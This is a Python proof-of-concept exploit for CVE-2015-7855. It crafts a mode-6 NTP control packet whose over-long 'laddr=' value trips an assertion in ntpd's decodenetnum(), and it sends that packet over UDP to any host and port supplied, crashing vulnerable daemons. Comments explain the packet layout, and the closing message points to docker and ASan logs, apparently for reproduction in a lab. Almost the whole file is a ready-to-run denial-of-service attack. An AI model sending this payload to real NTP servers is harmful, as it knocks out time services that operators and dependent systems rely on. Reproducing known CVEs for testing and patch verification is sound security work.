#!/usr/bin/env python3
"""
PoC for CVE-2015-7855 - ntpd decodenetnum() reachable assertion -> abort().

The decodenetnum() function in ntpd (libntp/decodenetnum.c) trips an ISC
INSIST/assertion (CWE-617) when handed an over-long address string, calling
abort() (SIGABRT). A mode-6 (ntpq) control packet whose variable-data field
carries a long `laddr=` value reaches that path.

Based on ExploitDB 40840 ("NTP 4.2.8p3 - Denial of Service",
Magnus Klaaborg Stubman). Affected: all ntp-4 < 4.2.8p4 and 4.3.0 < 4.3.77.

Header byte 0 = 0x16 -> LI=0, VN=2, Mode=6 (control). This is a MODE-6 packet,
so `enable mode7` is NOT required to reach decodenetnum().

Usage: poc_cve_2015_7855.py <host> <port>
"""
import socket
import sys

# Mode-6 control header: 0x16 = LI 0 | VN 2 | Mode 6 ; opcode 0x0a ;
# seq 0x0002 ; status 0x0000 ; assoc 0x0000 ; offset 0x0000 ;
# count 0x00a0 (160) ; then 160 bytes of "nonce=..., frags=32, laddr=99999..."
# where the long laddr value is fed to decodenetnum().
# 48-byte data prefix + 112 '9's = 160 data bytes, matching the count field
# 0x00a0. The 112-char laddr value is >> the name[80] buffer in decodenetnum(),
# so NTP_REQUIRE(strlen(num) < sizeof(name)) fails -> ISC assertion -> abort().
PAYLOAD = (
    b"\x16\x0a\x00\x02\x00\x00\x00\x00\x00\x00\x00\xa0"
    b"nonce=da3d5d0ff8081ec8352a2286, frags=32, laddr="
    + b"9" * 112
)


def main() -> int:
    if len(sys.argv) != 3:
        print(f"usage: {sys.argv[0]} <host> <port>")
        return 2

    host = sys.argv[1]
    port = int(sys.argv[2])

    print(f"[-] Sending CVE-2015-7855 mode-6 payload to {host}:{port} ...")
    print(f"[-] Payload length: {len(PAYLOAD)} bytes")
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.sendto(PAYLOAD, (host, port))
    sock.close()
    print("[+] Done. Check `docker logs` for the assertion / ASan abort.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
